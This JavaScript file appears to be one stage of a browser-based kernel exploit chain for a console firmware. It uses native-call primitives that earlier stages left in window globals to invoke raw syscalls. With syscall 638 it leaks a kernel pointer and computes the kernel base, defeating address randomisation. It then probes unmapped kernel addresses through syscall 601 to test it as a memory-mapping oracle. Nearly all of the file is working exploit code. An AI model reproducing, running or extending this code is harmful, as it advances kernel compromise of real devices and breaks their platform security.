// 601 oracle discriminator: is the kernel-pointer pass-through a real
// page-table walk (mapping oracle) or a range check (addr > VM_MAXUSER
// ⇒ pass)? Probe canonical KERNEL addresses that are certainly
// unmapped: 0xFFFFFFFF80000000 (~1GB below kbase), 0xFFFF800000000000
// (start of the kernel half), 0xFFFFFFFFFFFFF000 (last page). A real
// walk must EFAULT on all three; a range check returns ENOSYS. Known
// data page repeated as control. DO NOT probe non-canonical addresses
// (a real dereference of one would #GP the kernel). PID + restore.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native ||
      typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys638 !== "number" ||
      typeof native.wrappers.sys601 !== "number")
    throw new Error("chain_or_call64_missing");
  var frame = native.frame;
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("kod_preflight");
  phase = "derive_kbase";
  var out2Off = 0x1e00, out3Off = 0x1e10;
  var out2Addr = native.frameAddress + out2Off;
  var out3Addr = native.frameAddress + out3Off;
  var fv = new DataView(frame.buffer);
  var o2orig = Array.from(frame.subarray(out2Off, out2Off + 32));
  var c638 = native.call("sys638", [0, out2Addr, out3Addr]);
  if (c638.value !== 0)
    throw new Error("call638_failed");
  var klo = fv.getUint32(out2Off, true);
  var khi = fv.getUint32(out2Off + 4, true);
  var blo = (klo - 0x3B1AABA0) >>> 0;
  var bhi = khi;
  if (klo < 0x3B1AABA0) { blo = (klo - 0x3B1AABA0) >>> 0;
    bhi = (khi - 1) >>> 0; }
  mark("kod_kbase_ok");
  function probe(lo, hi) {
    var c = native.call64("sys601", [[lo, hi], [0x1000, 0]]);
    var e = (c.value === -1) ? native.readErrno() : null;
    return c.value + "/" + (e === null ? "ok" : e);
  }
  var lines = [];
  // control: known-mapped data page (kbase + 0x3AC30000, page-aligned)
  lines.push("kdata_control:" +
    probe((0xC4E50000 + 0x3AC30000) >>> 0, 0xffffffff));
  mark("kod_control_ok");
  // certainly-unmapped canonical kernel addresses
  lines.push("far_low:" + probe(0x80000000, 0xffffffff));
  lines.push("kern_half_start:" + probe(0, 0xffff8000));
  lines.push("last_page:" + probe(0xfffff000, 0xffffffff));
  mark("kod_far_done");
  for (var r = 0; r < 32; r++) frame[out2Off + r] = o2orig[r];
  var after = native.call("getpid", []);
  mark("kod_done");
  result = { id: "kmap_disc_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { lines: lines.join(" | ").slice(0, 300),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "kmap_disc_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
